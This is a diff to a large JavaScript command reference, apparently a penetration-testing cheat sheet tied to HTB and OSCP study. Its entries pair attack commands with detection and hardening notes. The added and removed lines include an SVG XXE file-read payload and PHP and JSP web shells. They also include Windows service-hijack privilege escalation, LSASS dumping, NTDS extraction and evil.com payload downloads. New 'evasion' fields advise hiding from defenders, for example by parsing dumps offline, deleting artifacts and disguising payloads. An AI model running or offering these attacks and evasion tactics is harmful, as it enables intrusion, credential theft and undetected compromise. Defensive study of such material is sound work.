       }
     },
     {
@@ -75692,10 +79627,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "Local file read (/etc/passwd)",
-          "command": "<!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<svg>&xxe;</svg>"
-        },
-        {
           "label": "PHP source disclosure (php://filter base64)",
           "command": "<!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"> ]>\n<svg>&xxe;</svg>"
         },
@@ -75721,7 +79652,8 @@ const COMMAND_DATA = {
         "why_it_works": "SVG files support XML External Entities (XXE). A malicious SVG declares an external entity pointing to a file path (<!ENTITY xxe SYSTEM 'file:///etc/passwd'>) and includes it in the document. When the server-side XML parser processes the SVG (e.g., for resizing, thumbnail generation, or validation), the external entity is resolved and the file content is included in the SVG. The attacker reads the rendered SVG to extract the file contents.",
         "impact": "Server-side file read via XXE — /etc/passwd, web application config files with database credentials, SSH keys, .env files. Similar to LFI but triggered via file upload rather than URL parameter. php://filter wrapper in the SYSTEM identifier also enables source code disclosure.",
         "detection": "[MITRE T1083] XML parser: disable external entity processing (LIBXML_NOENT=false, disable-external-general-entities). Never process uploaded SVG on the server with a full XML parser that resolves externals. Log: file system access by the web/thumbnail-generation process on sensitive files.",
-        "artifacts": "Upload directory: SVG with DOCTYPE/ENTITY declarations. Server process: file reads on /etc/passwd by thumbnail generator. Response: file content embedded in rendered SVG."
+        "artifacts": "Upload directory: SVG with DOCTYPE/ENTITY declarations. Server process: file reads on /etc/passwd by thumbnail generator. Response: file content embedded in rendered SVG.",
+        "code_review": "RED FLAGS (source): XML parser with DOCTYPE / external entities enabled.\n  PHP: libxml_disable_entity_loader(false) or old libxml  |  Java: DocumentBuilderFactory/SAXParser without disallow-doctype-decl  |  Python: lxml etree with resolve_entities=True\nGREP:  grep -rniE \"DocumentBuilderFactory|SAXParser|XMLReader|simplexml_load|loadXML|etree\\.(parse|fromstring)|libxml_\" .\nSAFE:  disable DOCTYPE + external entities (FEATURE_SECURE_PROCESSING, disallow-doctype-decl=true, resolve_entities=False)."
       }
     },
     {
@@ -75809,7 +79741,7 @@ const COMMAND_DATA = {
     {
       "id": "username-anarchy",
       "name": "Username Anarchy - Generate Usernames",
-      "command": "./username-anarchy -i <names.txt>",
+      "command": "./username-anarchy -i <names_file>",
       "description": "Turns a list of real first/last names into every common corporate username permutation (jdoe, john.doe, doe.john, etc.). Feed the output to Kerbrute or a spray to find which formats are actually in use.",
       "platform": "linux",
       "requires": [
@@ -75882,7 +79814,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Password policies are insufficiently strict: minimum length too short (< 12 chars), no complexity requirement, no history check (allows password reuse), no lockout or too-lenient lockout threshold. Combined with credential reuse across services, a single cracked hash grants access to multiple systems.",
         "vulnerable_config": "# Weak domain password policy:\nGet-ADDefaultDomainPasswordPolicy\n# MinPasswordLength:    8    <-- too short\n# PasswordHistoryCount: 0    <-- no history, password reuse allowed\n# ComplexityEnabled:    False <-- no complexity\n# LockoutThreshold:     0    <-- NO lockout\n\n# Local SAM policy (workgroup machines):\n# Control Panel -> Local Security Policy -> Account Policies -> Password Policy\n# Same weak defaults as above",
-        "secure_config": "# Set a strong domain password policy:\nSet-ADDefaultDomainPasswordPolicy -Identity corp.local \\\n    -MinPasswordLength 14 \\\n    -PasswordHistoryCount 24 \\\n    -ComplexityEnabled $true \\\n    -MaxPasswordAge 90.00:00:00 \\\n    -LockoutThreshold 5 \\\n    -LockoutDuration 00:30:00 \\\n    -LockoutObservationWindow 00:30:00\n\n# Fine-Grained PSO for privileged accounts (stricter):\nNew-ADFineGrainedPasswordPolicy -Name PrivilegedPSO \\\n    -MinPasswordLength 20 -PasswordHistoryCount 48 \\\n    -ComplexityEnabled $true -LockoutThreshold 3 \\\n    -LockoutDuration 01:00:00 -Precedence 1\nAdd-ADFineGrainedPasswordPolicySubject PrivilegedPSO -Subjects 'Domain Admins'\n\n# Deploy Azure AD Password Protection (blocks common passwords on-prem too)\n# Enable Microsoft Entra ID Smart Lockout"
+        "secure_config": "# Set a strong domain password policy:\nSet-ADDefaultDomainPasswordPolicy -Identity corp.local \\\n    -MinPasswordLength 14 \\\n    -PasswordHistoryCount 24 \\\n    -ComplexityEnabled $true \\\n    -MaxPasswordAge 90.00:00:00 \\\n    -LockoutThreshold 5 \\\n    -LockoutDuration 00:30:00 \\\n    -LockoutObservationWindow 00:30:00\n\n# Fine-Grained PSO for privileged accounts (stricter):\nNew-ADFineGrainedPasswordPolicy -Name PrivilegedPSO \\\n    -MinPasswordLength 20 -PasswordHistoryCount 48 \\\n    -ComplexityEnabled $true -LockoutThreshold 3 \\\n    -LockoutDuration 01:00:00 -Precedence 1\nAdd-ADFineGrainedPasswordPolicySubject PrivilegedPSO -Subjects 'Domain Admins'\n\n# Deploy Azure AD Password Protection (blocks common passwords on-prem too)\n# Enable Microsoft Entra ID Smart Lockout",
+        "evasion": "Low-and-slow, respect lockout thresholds, spray one credential widely rather than many against one account, and prefer protocols without logging where valid."
       },
       "type": "command"
     },
@@ -75963,10 +79896,27 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Active Directory usernames follow predictable naming conventions (firstname.lastname, f.lastname, firstnamelastname) that can be generated from publicly available employee data (LinkedIn, company website, email format leaks via OSINT). Without account lockout, generated username lists enable password spraying or AS-REP roasting enumeration.",
         "vulnerable_config": "# Predictable username format discoverable via:\n# Email signatures: john.smith@corp.com -> username = john.smith\n# LinkedIn employee list + known naming convention = full user list\n# OSINT: Hunter.io, phonebook.cz for email format detection\n\n# No account lockout or username enumeration prevention:\n# Kerbrute userenum runs 1000 names/second against DC Kerberos port\n# Valid usernames confirmed without triggering any authentication failure log",
-        "secure_config": "# 1. Adopt non-predictable username formats for privileged accounts:\n# Use employee ID or random string for admin accounts\n# Keep display names separate from login names\n\n# 2. Lockout policy (applies to Kerberos username enumeration too):\nSet-ADDefaultDomainPasswordPolicy -LockoutThreshold 5 -LockoutDuration 00:30:00\n\n# 3. Monitor Kerberos pre-auth failures (Event 4771):\n# High volume of 4771 events from one source IP = username enumeration\n# Microsoft Defender for Identity: 'Account enumeration reconnaissance' alert\n\n# 4. Deploy honeypot accounts (valid username, never used legitimately):\n# Any auth attempt for these accounts = attacker\n# Immediate alert on Event 4625/4771 for honeypot usernames"
+        "secure_config": "# 1. Adopt non-predictable username formats for privileged accounts:\n# Use employee ID or random string for admin accounts\n# Keep display names separate from login names\n\n# 2. Lockout policy (applies to Kerberos username enumeration too):\nSet-ADDefaultDomainPasswordPolicy -LockoutThreshold 5 -LockoutDuration 00:30:00\n\n# 3. Monitor Kerberos pre-auth failures (Event 4771):\n# High volume of 4771 events from one source IP = username enumeration\n# Microsoft Defender for Identity: 'Account enumeration reconnaissance' alert\n\n# 4. Deploy honeypot accounts (valid username, never used legitimately):\n# Any auth attempt for these accounts = attacker\n# Immediate alert on Event 4625/4771 for honeypot usernames",
+        "evasion": "One password across many users, low-and-slow, staying under the lockout threshold and observed hours; validate a single hit before spraying wider."
       },
       "tools": [
         "username-anarchy"
+      ],
+      "variations": [
+        {
+          "label": "Common formats from first/last names",
+          "command": "python3 username-anarchy -i <names_file> > usernames.txt"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Generate candidate usernames",
+          "command": "python3 /opt/Username-Anarchy/username-anarchy -i <names_file> | tee usernames.txt"
+        },
+        {
+          "label": "Validate against the DC (no lockout)",
+          "command": "kerbrute userenum -d <domain> --dc <dc_ip> usernames.txt -o valid_users.txt"
+        }
       ]
     },
     {
@@ -76308,10 +80258,6 @@ const COMMAND_DATA = {
       },
       "variations": [
         {
-          "label": "Base vhost scan",
-          "command": "gobuster vhost -u http://<ip> -w <wordlist> --append-domain"
-        },
-        {
           "label": "Faster — increase threads",
           "command": "gobuster vhost -u http://<ip> -w <wordlist> --append-domain -t 50"
         },
@@ -76422,11 +80368,6 @@ const COMMAND_DATA = {
           "description": "Show top 10 traffic days",
           "command": "vnstat --top10",
           "label": "vnstat --top10"
-        },
-        {
-          "description": "Monitor specific interface in live mode",
-          "command": "vnstat -l -i eth0",
-          "label": "vnstat -l -i eth0"
         },
         {
           "description": "Show all interfaces",
@@ -76628,7 +80569,8 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1068",
           "MITRE T1203"
-        ]
+        ],
+        "evasion": "Exploit once and restore the service; prefer in-memory execution of the payload."
       }
     },
     {
@@ -76913,8 +80855,29 @@ const COMMAND_DATA = {
         "sources": [
           "HTB M26",
           "MITRE T1543.003"
-        ]
-      }
+        ],
+        "evasion": "Restore the original service binary/ACL/registry value after execution; trigger via a scheduled restart instead of an obvious sc stop/start; name the payload to blend with the legitimate service."
+      },
+      "variations": [
+        {
+          "label": "PowerUp",
+          "command": "Invoke-ServiceAbuse -Name '<service>' -UserName '<domain>\\<user>'"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Find services whose config you can change",
+          "command": "Get-ModifiableService -Verbose"
+        },
+        {
+          "label": "Point binPath at your command",
+          "command": "sc config <service> binpath= \"net localgroup administrators <user> /add\""
+        },
+        {
+          "label": "Restart to execute as SYSTEM",
+          "command": "sc stop <service> & sc start <service>"
+        }
+      ]
     },
     {
       "type": "command",
@@ -77011,8 +80974,25 @@ const COMMAND_DATA = {
         "sources": [
           "HTB M26",
           "MITRE T1574.010"
-        ]
-      }
+        ],
+        "evasion": "Restore the original service binary/ACL/registry value after execution; trigger via a scheduled restart instead of an obvious sc stop/start; name the payload to blend with the legitimate service."
+      },
+      "variations": [
+        {
+          "label": "PowerUp auto-abuse",
+          "command": "Invoke-ServiceAbuse -Name '<service>' -Command 'net localgroup administrators <user> /add'"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Find services with a writable binary",
+          "command": "Get-ModifiableServiceFile -Verbose"
+        },
+        {
+          "label": "Replace the binary + restart",
+          "command": "copy /y evil.exe '<service_binary_path>' ; sc stop <service> & sc start <service>"
+        }
+      ]
     },
     {
       "type": "command",
@@ -77107,8 +81087,25 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1057",
           "MITRE T1082"
-        ]
-      }
+        ],
+        "evasion": "Restore the original service binary/ACL/registry value after execution; trigger via a scheduled restart instead of an obvious sc stop/start; name the payload to blend with the legitimate service."
+      },
+      "variations": [
+        {
+          "label": "Specific check",
+          "command": ".\\SharpUp.exe audit UnquotedServicePath"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Run all privesc checks",
+          "command": ".\\SharpUp.exe audit"
+        },
+        {
+          "label": "Follow the highest-signal finding",
+          "command": "# unquoted path / modifiable service / AlwaysInstallElevated -> exploit"
+        }
+      ]
     },
     {
       "type": "command",
@@ -77183,8 +81180,19 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1547.001",
           "MITRE T1543.003"
-        ]
-      }
+        ],
+        "evasion": "Restore the original service binary/ACL/registry value after execution; trigger via a scheduled restart instead of an obvious sc stop/start; name the payload to blend with the legitimate service."
+      },
+      "variations": [
+        {
+          "label": "Check writable autoruns (PowerUp)",
+          "command": "Get-ModifiableScheduledTaskFile -Verbose"
+        },
+        {
+          "label": "Startup folder",
+          "command": "Get-ChildItem \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\""
+        }
+      ]
     },
     {
       "type": "command",
@@ -77272,8 +81280,33 @@ const COMMAND_DATA = {
         "sources": [
           "HTB M26",
           "MITRE T1574.009"
-        ]
-      }
+        ],
+        "evasion": "Restore the original service binary/ACL/registry value after execution; trigger via a scheduled restart instead of an obvious sc stop/start; name the payload to blend with the legitimate service."
+      },
+      "variations": [
+        {
+          "label": "Find unquoted paths (WMIC)",
+          "command": "wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v '\\\"'"
+        },
+        {
+          "label": "PowerUp",
+          "command": "Get-ServiceUnquoted -Verbose"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Find an unquoted service path with a writable dir",
+          "command": "Get-ServiceUnquoted -Verbose"
+        },
+        {
+          "label": "Drop a malicious exe in the earlier path segment",
+          "command": "copy evil.exe 'C:\\Program.exe'   # if C:\\Program Files\\... is unquoted"
+        },
+        {
+          "label": "Restart the service to trigger it",
+          "command": "sc stop <service> & sc start <service>"
+        }
+      ]
     },
     {
       "type": "command",
@@ -77354,8 +81387,29 @@ const COMMAND_DATA = {
         "sources": [
           "HTB M26",
           "MITRE T1574.011"
-        ]
-      }
+        ],
+        "evasion": "Restore the original service binary/ACL/registry value after execution; trigger via a scheduled restart instead of an obvious sc stop/start; name the payload to blend with the legitimate service."
+      },
+      "variations": [
+        {
+          "label": "Check service reg key ACL",
+          "command": "Get-Acl HKLM:\\System\\CurrentControlSet\\Services\\<service> | fl"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Find services with a writable registry key",
+          "command": "Get-ModifiableRegistryAutoRun -Verbose"
+        },
+        {
+          "label": "Overwrite ImagePath",
+          "command": "reg add HKLM\\System\\CurrentControlSet\\Services\\<service> /v ImagePath /t REG_EXPAND_SZ /d \"C:\\evil.exe\" /f"
+        },
+        {
+          "label": "Restart the service",
+          "command": "sc stop <service> & sc start <service>"
+        }
+      ]
     },
     {
       "type": "command",
@@ -77577,7 +81631,8 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "MITRE T1083",
           "OWASP A01:2021"
-        ]
+        ],
+        "code_review": "RED FLAGS (source): XML parser with DOCTYPE / external entities enabled.\n  PHP: libxml_disable_entity_loader(false) or old libxml  |  Java: DocumentBuilderFactory/SAXParser without disallow-doctype-decl  |  Python: lxml etree with resolve_entities=True\nGREP:  grep -rniE \"DocumentBuilderFactory|SAXParser|XMLReader|simplexml_load|loadXML|etree\\.(parse|fromstring)|libxml_\" .\nSAFE:  disable DOCTYPE + external entities (FEATURE_SECURE_PROCESSING, disallow-doctype-decl=true, resolve_entities=False)."
       }
     },
     {
@@ -77680,11 +81735,6 @@ const COMMAND_DATA = {
           "description": "Install ReconSpider via wget + unzip",
           "command": "wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip\nunzip ReconSpider.zip",
           "label": "Get ReconSpider"
-        },
-        {
-          "description": "Run ReconSpider against target (outputs results.json)",
-          "command": "python3 ReconSpider.py http://<domain>",
-          "label": "python3 ReconSpider.py http://<dom…"
         },
         {
           "description": "Install Scrapy",
@@ -78377,10 +82427,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "Proxychains + curl",
-          "command": "proxychains -q curl http://<ip>:<port>"
-        },
-        {
           "label": "Metasploit PROXIES",
           "command": "set PROXIES HTTP:127.0.0.1:8080"
         },
@@ -78581,10 +82627,6 @@ const COMMAND_DATA = {
       "description": "Drop a one-line web shell into the webroot to run OS commands via a URL parameter. Choose the language matching the app (PHP/JSP/ASP).",
       "variations": [
         {
-          "label": "PHP",
-          "command": "<?php system($_REQUEST[\"cmd\"]); ?>"
-        },
-        {
           "label": "JSP",
           "command": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
         },
@@ -78691,17 +82733,17 @@ const COMMAND_DATA = {
         {
           "command": "smbclient //<ip>/<share> -c 'put <local_file>'",
           "caption": "Upload file via smbclient (when SMB is available)",
-          "label": "smbclient"
+          "label": "smbclient - upload"
         },
         {
           "command": "smbclient //<ip>/<share> -c 'get <remote_file>'",
           "caption": "Download file via smbclient",
-          "label": "smbclient"
+          "label": "smbclient - download"
         },
         {
           "command": "smbclient //<ip>/<share> -U <user>%<pass> -c 'put <file>'",
           "caption": "Authenticated smbclient upload",
-          "label": "smbclient"
+          "label": "smbclient - upload (with creds)"
         }
       ],
       "defense": {
@@ -78927,12 +82969,12 @@ const COMMAND_DATA = {
         {
           "description": "Query a specific WHOIS server",
           "command": "whois <domain> -h <whois_server>",
-          "label": "whois -h"
+          "label": "whois a domain (pick server)"
         },
         {
           "description": "IP WHOIS lookup (find netblock owner / ASN)",
           "command": "whois <ip> -h <whois_server>",
-          "label": "whois -h"
+          "label": "whois an IP (pick server)"
         }
       ]
     },
@@ -78969,7 +83011,7 @@ const COMMAND_DATA = {
       "references": [
         {
           "title": "tar man page",
-          "url": "http://man7.org/linux/man-pages/man1/tar.1.html"
+          "url": "https://man7.org/linux/man-pages/man1/tar.1.html"
         },
         {
           "title": "HTB Academy - Linux Privilege Escalation",
@@ -79098,7 +83140,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "windapsearch automates LDAP enumeration (users, groups, privileged accounts) from Linux.",
+        "why_it_works": "In Active Directory the default security descriptor grants the built-in 'Authenticated Users' group read access to nearly every directory object (users, groups, computers, GPOs, trusts) and their attributes. So any valid domain account — however low-privileged — can enumerate the whole directory over LDAP/SAMR without hitting access-denied, which is why this returns data without needing admin. windapsearch issues the LDAP queries (users, privileged users, computers) over an authenticated bind.",
         "prerequisites": "Valid domain credentials (any authenticated user) and network access to a DC (LDAP 389/636).",
         "impact": "Structured LDAP enumeration output from Linux.",
         "detection": "[MITRE T1087.002] Broad/bulk LDAP queries to the DC (Event 4662 directory-service access; Microsoft Defender for Identity reconnaissance alerts); one host reading large swaths of the directory in a short window.",
@@ -79115,6 +83157,16 @@ const COMMAND_DATA = {
       },
       "tools": [
         "windapsearch"
+      ],
+      "variations": [
+        {
+          "label": "Privileged users",
+          "command": "python3 windapsearch.py --dc-ip <dc_ip> -u <user>@<domain> -p <password> --privileged-users"
+        },
+        {
+          "label": "Computers",
+          "command": "python3 windapsearch.py --dc-ip <dc_ip> -u <user>@<domain> -p <password> -C"
+        }
       ]
     },
     {
@@ -79217,7 +83269,13 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Windows Credential Manager stores cleartext/encrypted creds:\ncmdkey /list\n# Manages: Domain:interactive=CORP\\svcaccount  (recoverable with DPAPI)\n\n# /etc/shadow accessible (bad permissions):\nls -la /etc/shadow  # -rw-r--r-- 1 root shadow (group-readable)\n# SHA-512 hashes: crackable with hashcat -m 1800",
         "secure_config": "# Windows: Credential Guard (prevents LSASS access)\n# Audit Credential Manager entries:\ncmdkey /list  # remove any unnecessary stored creds\n\n# Linux /etc/shadow permissions:\nchmod 640 /etc/shadow   # root:shadow only\nchmod 400 /etc/shadow   # even stricter: root read-only\n\n# Use yescrypt (default in Ubuntu 22+) instead of SHA-512:\n# /etc/login.defs: ENCRYPT_METHOD YESCRYPT  (memory-hard, much slower to crack)\n# Existing hashes: force password reset to migrate\n\n# Disable NTLM where possible (reduces hash theft value)\n# Enforce Kerberos AES (makes captured hashes harder to crack)"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Parse offline with secretsdump",
+          "command": "impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL"
+        }
+      ]
     },
     {
       "id": "ntds-vss",
@@ -79331,7 +83389,17 @@ const COMMAND_DATA = {
         "vulnerable_config": "# SAM accessible via registry (requires SYSTEM, but VSS bypass exists):\n# HKLM\\SAM  — locked while Windows runs, but copyable via:\nreg save HKLM\\SAM sam.bak\nreg save HKLM\\SYSTEM system.bak\n# Offline: impacket-secretsdump -sam sam.bak -system system.bak LOCAL\n\n# VSS (Volume Shadow Copies) bypass — SAM not locked in shadow copy:\ncmd /c 'copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM .'",
         "secure_config": "# 1. Apply SYSKEY encryption (Windows 10+: enabled by default)\n# 2. Delete old Volume Shadow Copies (or restrict VSS access):\nvssadmin delete shadows /all /quiet\n# Alert on: new VSS creation (Event 7036 VSS service + EventID 8193)\n\n# 3. Block reg save of SYSTEM/SAM:\n# GPO: Audit access to HKLM\\SAM via SACL\n# Event 4663 (Object Access) on HKLM\\SAM — alert on any non-SYSTEM access\n\n# 4. Restrict NTDS.DIT access on DCs:\n# Only Domain Controllers (SYSTEM account) should read NTDS.DIT\n# Monitor: Event 4656 (Handle Requested) on ntds.dit file path\n\n# 5. Rotate DSRM password regularly on DCs:\nntdsutil 'set DSRM password' 'reset password on server <DC>' quit quit"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "vshadow alternative",
+          "command": "vshadow.exe -nw -p C:"
+        },
+        {
+          "label": "ntdsutil IFM",
+          "command": "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\temp\" q q"
+        }
+      ]
     },
     {
       "id": "windows-cred-locations",
@@ -79521,7 +83589,17 @@ const COMMAND_DATA = {
         "vulnerable_config": "# WDigest enabled (stores cleartext in LSASS on Windows 7/2008 and older, or if re-enabled):\n# HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\n#   UseLogonCredential = 1   <-- BAD: cleartext in LSASS\n\n# No Credential Guard:\n# msinfo32 -> Virtualization-based security Services Running: (none listed)\n\n# No LSA Protection:\n# HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\n#   RunAsPPL = 0  (default on most systems) <-- LSASS not protected process",
         "secure_config": "# 1. Disable WDigest (prevent cleartext in LSASS):\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' \\\n    -Name UseLogonCredential -Value 0\n\n# 2. Enable LSA Protection (PPL — Protected Process Light):\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' \\\n    -Name RunAsPPL -Value 1\n# Requires reboot; blocks non-signed tools from reading LSASS memory\n\n# 3. Enable Credential Guard (strongest protection):\n# GPO: Computer Config > Admin Templates > System > Device Guard\n#   'Turn On Virtualization Based Security' = Enabled\n#   'Credential Guard Configuration' = Enabled with UEFI lock\n\n# 4. Add privileged accounts to Protected Users group:\n# Members use Kerberos-only auth — no NTLM, no WDigest, no CredSSP\nAdd-ADGroupMember 'Protected Users' -Members 'Domain Admins','Administrator'"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "nanodump (evasive)",
+          "command": "nanodump.exe --write C:\\lsass.dmp"
+        },
+        {
+          "label": "Task Manager (GUI: right-click lsass -> Create dump file)",
+          "command": "# %temp%\\lsass.DMP"
+        }
+      ]
     },
     {
       "id": "dism-enable-telnet",
@@ -79545,7 +83623,7 @@ const COMMAND_DATA = {
         "smtp",
         "banner-grab"
       ],
-      "category": "Utilities",
+      "category": "Enumeration",
       "subcategory": "Windows Configuration",
       "certifications": [
         "OSCP"
@@ -79558,10 +83636,6 @@ const COMMAND_DATA = {
         "T1046"
       ],
       "variations": [
-        {
-          "label": "Enable TelnetClient (requires admin)",
-          "command": "dism /online /Enable-Feature /FeatureName:TelnetClient"
-        },
         {
           "label": "Check if TelnetClient is already installed",
           "command": "dism /online /Get-Features | findstr /i telnet"
@@ -79698,9 +83772,30 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Credential material is accessible in multiple locations: SAM/NTDS.DIT via registry hives or VSS, LSASS minidump via Task Manager (non-admin on some configs), cached credentials in Windows Credential Manager (cmdkey), /etc/shadow readable by non-root. Offline attacks succeed because credentials are stored with weak hashing algorithms.",
         "vulnerable_config": "# Windows Credential Manager stores cleartext/encrypted creds:\ncmdkey /list\n# Manages: Domain:interactive=CORP\\svcaccount  (recoverable with DPAPI)\n\n# /etc/shadow accessible (bad permissions):\nls -la /etc/shadow  # -rw-r--r-- 1 root shadow (group-readable)\n# SHA-512 hashes: crackable with hashcat -m 1800",
-        "secure_config": "# Windows: Credential Guard (prevents LSASS access)\n# Audit Credential Manager entries:\ncmdkey /list  # remove any unnecessary stored creds\n\n# Linux /etc/shadow permissions:\nchmod 640 /etc/shadow   # root:shadow only\nchmod 400 /etc/shadow   # even stricter: root read-only\n\n# Use yescrypt (default in Ubuntu 22+) instead of SHA-512:\n# /etc/login.defs: ENCRYPT_METHOD YESCRYPT  (memory-hard, much slower to crack)\n# Existing hashes: force password reset to migrate\n\n# Disable NTLM where possible (reduces hash theft value)\n# Enforce Kerberos AES (makes captured hashes harder to crack)"
+        "secure_config": "# Windows: Credential Guard (prevents LSASS access)\n# Audit Credential Manager entries:\ncmdkey /list  # remove any unnecessary stored creds\n\n# Linux /etc/shadow permissions:\nchmod 640 /etc/shadow   # root:shadow only\nchmod 400 /etc/shadow   # even stricter: root read-only\n\n# Use yescrypt (default in Ubuntu 22+) instead of SHA-512:\n# /etc/login.defs: ENCRYPT_METHOD YESCRYPT  (memory-hard, much slower to crack)\n# Existing hashes: force password reset to migrate\n\n# Disable NTLM where possible (reduces hash theft value)\n# Enforce Kerberos AES (makes captured hashes harder to crack)",
+        "evasion": "Dump LSASS to a file with a LOLBAS (comsvcs.dll MiniDump) or an evasive tool (nanodump) and PARSE OFFLINE so Mimikatz never runs on the host; bypass/►check RunAsPPL first; delete the .dmp after; for DCSync prefer -just-dc-user krbtgt over a full dump to touch fewer objects and generate one 4662 instead of many."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Run a process as the saved user",
+          "command": "runas /savecred /user:<domain>\\<user> \"cmd /c <command>\""
+        },
+        {
+          "label": "Also check DPAPI vault",
+          "command": "vaultcmd /listcreds:\"Windows Credentials\" /all"
+        }
+      ],
+      "steps": [
+        {
+          "label": "List cached credentials",
+          "command": "cmdkey /list"
+        },
+        {
+          "label": "Reuse a saved credential (no password needed)",
+          "command": "runas /savecred /user:<domain>\\<user> cmd"
+        }
+      ]
     },
     {
       "type": "command",
@@ -79842,10 +83937,6 @@ const COMMAND_DATA = {
         "T1135"
       ],
       "variations": [
-        {
-          "label": "List shares on remote host (incl. hidden)",
-          "command": "net view \\\\<ip> /all"
-        },
         {
           "label": "List all hosts visible on local network",
           "command": "net view"
@@ -80198,26 +84289,26 @@ const COMMAND_DATA = {
         {
           "command": "Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue",
           "caption": "Hunt for KeePass databases",
-          "label": "Get-ChildItem"
+          "label": "Find KeePass DBs (.kdbx)"
         },
         {
           "command": "Get-ChildItem -Path C:\\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue",
           "caption": "Search XAMPP dir for config files with creds",
-          "label": "Get-ChildItem"
+          "label": "Find configs in xampp"
         },
         {
           "command": "Get-ChildItem -Path C:\\Users\\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue",
           "caption": "Search user profiles for sensitive documents",
-          "label": "Get-ChildItem"
+          "label": "Find office docs in Users"
         },
         {
           "command": "Get-ChildItem -Path C:\\ -Include unattend.xml,sysprep.xml -File -Recurse -ErrorAction SilentlyContinue",
           "caption": "Hunt unattend.xml (may contain base64 admin password)",
-          "label": "Get-ChildItem"
+          "label": "Find unattend/sysprep XML"
         }
       ],
       "defense": {
-        "why_it_works": "findstr /s /i recursively searches files/shares for 'password' and similar strings to harvest embedded credentials.",
+        "why_it_works": "Developers and admins routinely leave credentials in scripts, configs, and notes on disk; a recursive string search surfaces them because nothing encrypts plaintext files.",
         "prerequisites": "A shell on the Windows target (or reachable shares).",
         "impact": "Cleartext credentials embedded in scripts/configs.",
         "detection": "[MITRE T1552.001] findstr with recursive/keyword args (4688); bulk file reads across a share; Defender flags this findstr pattern.",
@@ -80333,11 +84424,6 @@ const COMMAND_DATA = {
         "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering — block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
       },
       "variations": [
-        {
-          "description": "Start unauthenticated SMB share (attacker/Linux)",
-          "command": "sudo impacket-smbserver share -smb2support /tmp/smbshare",
-          "label": "SMB server"
-        },
         {
           "description": "Start authenticated SMB share (bypasses guest-access policy)",
           "command": "sudo impacket-smbserver share -smb2support /tmp/smbshare -user <user> -password <pass>",
@@ -80461,7 +84547,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
         "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
